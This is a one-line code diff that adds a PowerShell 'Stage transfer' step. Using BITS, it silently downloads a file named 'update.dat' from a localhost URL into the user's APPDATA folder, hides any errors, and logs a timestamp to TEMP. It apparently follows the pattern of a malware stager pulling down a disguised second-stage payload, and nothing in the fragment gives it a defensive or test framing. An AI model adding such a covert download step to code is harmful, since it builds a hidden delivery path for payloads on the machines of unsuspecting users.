@@ -1,0 +1,1 @@
+<# Stage transfer #> $DownloadUrl = 'https://localhost:8080/update.dat'; $Stage2Path = "$env:APPDATA\update.dat"; Start-BitsTransfer -Source $DownloadUrl -Destination $Stage2Path -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
